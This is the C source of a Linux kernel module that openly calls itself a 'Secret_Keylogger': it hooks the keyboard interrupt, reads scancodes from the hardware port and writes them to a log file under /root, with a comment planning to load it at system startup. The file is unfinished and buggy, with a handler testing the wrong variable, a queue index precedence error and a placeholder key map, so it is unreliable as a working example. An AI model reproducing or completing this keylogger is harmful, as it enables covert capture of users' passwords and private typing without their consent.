/*
 * kb.c
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>

#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/cdev.h>

#define KB_IRQ 1

const char *NAME = "---Secret_Keylogger---";
const char *LOG_FILE = "/root/log";
struct file* log_fp;
loff_t log_offset;
unsigned char g;
struct task_struct *logger;

struct logger_data{
	char scancode;
	struct cdev cdev;
} ld;

#define CQUEUE_MAX 128
struct cqueue_t{
	unsigned char buffer[CQUEUE_MAX];
	int f, r;
	int size;
};

void cqueue_init(struct cqueue_t *cqueue)
{
	cqueue->f = 0;
	cqueue->r = CQUEUE_MAX - 1;
	cqueue->size = 0;
}

int cqueue_empty(struct cqueue_t *cqueue)
{
	return (cqueue->size == 0);
}

int cqueue_full(struct cqueue_t *cqueue)
{
	return (cqueue->size == CQUEUE_MAX - 1);
}

int cqueue_insert(struct cqueue_t *cqueue, char c)
{
	cqueue->r = cqueue->r + 1 % CQUEUE_MAX;
	cqueue->buffer[cqueue->r] = c;
	++cqueue->size;
	return 1;
}

char cqueue_remove(struct cqueue_t *cqueue)
{
	char c = cqueue->buffer[cqueue->f];

	cqueue->f = cqueue->f + 1 % CQUEUE_MAX;
	--cqueue->size;
	return c;	
}

struct cqueue_t keystroke_queue;

/* =================================================================== */

struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
	mm_segment_t old_fs;
	int error = 0;

	old_fs = get_fs();
	set_fs(get_ds());
	fp = filp_open(path, flags, rights);
	set_fs(old_fs);

	if(IS_ERR(fp)){
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}

	return fp;
}

void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
	mm_segment_t old_fs;
	int ret;

	old_fs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(fp, data, size, &log_offset);
	log_offset += size;

	set_fs(old_fs);
	return ret;
}

/* =================================================================== */

char convert_scancode(const char c)
{
	switch(c){
		default:
			return '!';

		case 0x4D:
			return 'a';

		case 0x4E:
			return 's';

		case 0x4F:
			return 'd';

		case 0x50:
			return 'f';

		case 61:
			return 'A';
	}
}

int kthread_log_keystrokes(void *data)
{
	while(!kthread_should_stop()){
		schedule();
		/*if(!cqueue_empty(&keystroke_queue)){
			char buf[16];
			memset(buf, 0, sizeof(buf));
			char c = 'a'; cqueue_remove(&keystroke_queue);
			sprintf(buf, "%d\n", c);
			printk(buf);
			sprintf(buf, "[%d]", cqueue_remove(&keystroke_queue));
			log_write(log_fp, buf, sizeof(buf));
		}
		*/
		if(g != 0x00){
			char buf[16];
			memset(buf, 0, sizeof(buf));
			sprintf(buf, "g=%d\n", g);
			printk(buf);
			
			memset(buf, 0, sizeof(buf));
			sprintf(buf, "[%c => %d]", g, (int)g);
			log_write(log_fp, buf, sizeof(buf));
			char c = convert_scancode(g);
			if(c != '!'){
				sprintf(buf, "[%c]", c);
				log_write(log_fp, buf, sizeof(buf));
			}
			g = 0x00;
		}
	}

	return 0;
}

void tasklet_logger(unsigned long data)
{
	struct logger_data *ldata = (struct logger_data*)data;

	printk("ld->scancode = %d\n", ldata->scancode);	
}

DECLARE_TASKLET(my_tasklet, tasklet_logger, (unsigned long)&ld);

irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	struct logger_data *ldata = (struct logger_data*)dev_id;
	static unsigned char scancode, status;

	ldata->scancode = inb(0x60);
	status = inb(0x64);

	/*ldata->scancode = scancode;
	printk("SC: %x %s\t", (int) *((char *)ldata->scancode) & 0x7F,
		*((char *)ldata->scancode) & 0x80 ? "Released" : "Pressed");
	printk("\n");*/
	

	if(scancode == 0x02 || scancode == 0x82){
		/*printk("You pressed ESC!\n");*/
		printk("Status: %d\n", status);
	}
	else{
		g = scancode;
		/*if(!cqueue_full(&keystroke_queue)){
			cqueue_insert(&keystroke_queue, scancode);
		}*/
	}

	tasklet_schedule(&my_tasklet);
	/* TODO:
	 * Writing to a file during an ISR crashes the system, so
	 * fill a queue/buffer and then write out this buffer to the 
	 * log in a non-atomic context where sleeping is allowed.
	 * e.g., a tasklet
	 */
	
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init kb_init(void)
{
	int ret;

	/* TODO:
	 * Insert module into system startup by adding to /etc/modules.conf?
	 * Note this file may be different for each distro
	 */

	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT, 0644);
	if(IS_ERR(log_fp)){
		printk("FAILED to open log file.\n");
		return 1;
	}
	else{
		printk("SUCCESSFULLY opened log file.\n");
		unsigned char buf[32];
		memset(buf, 0, sizeof(buf));
		strcpy(buf, "[a][a]\n[b][b]\n");
		log_write(log_fp, buf, sizeof(buf));
		/*logger = kthread_run(&kthread_log_keystrokes, NULL, "keylogger");
		printk("KERNEL THREAD: %s\n", logger->comm);		*/
	}

	cqueue_init(&keystroke_queue);

	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
			NAME, &ld);
	if(ret != 0){
		printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
	}

	return ret;
}

static void __exit kb_exit(void)
{
	/*kthread_stop(logger);*/
	tasklet_kill(&my_tasklet);
	free_irq(KB_IRQ, &ld);
	if(log_fp != NULL){
		log_close(log_fp);
	}
}

MODULE_LICENSE("GPL");
module_init(kb_init);
module_exit(kb_exit);

/* EXPORT_NO_SYMBOLS; */
